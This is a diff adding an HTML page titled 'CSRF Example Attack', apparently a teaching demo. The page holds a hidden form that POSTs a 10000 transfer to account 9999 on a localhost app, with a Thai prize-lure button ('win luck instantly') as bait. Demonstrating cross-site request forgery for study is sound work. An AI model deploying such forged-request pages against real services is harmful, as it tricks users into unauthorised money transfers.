@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CSRF Example Attack</title>
+  </head>
+  <body>
+    <form action="http://localhost:3000/transfer" method="POST">
+      <input type="hidden" name="_csrf" value="lamwdkamwkdmawkm#@$#@^" />
+      <input
+        type="hidden"
+        name="amount"
+        placeholder="กรุณาระบุจำนวนเงิน"
+        value="10000"
+      />
+      <input
+        type="hidden"
+        name="toAccount"
+        placeholder="กรุณาระบุบัญชีปลายทาง"
+        value="9999"
+      />
+      <button type="submit">ลุ้นรับโชคทันที!!!</button>
+    </form>
+  </body>
+</html>
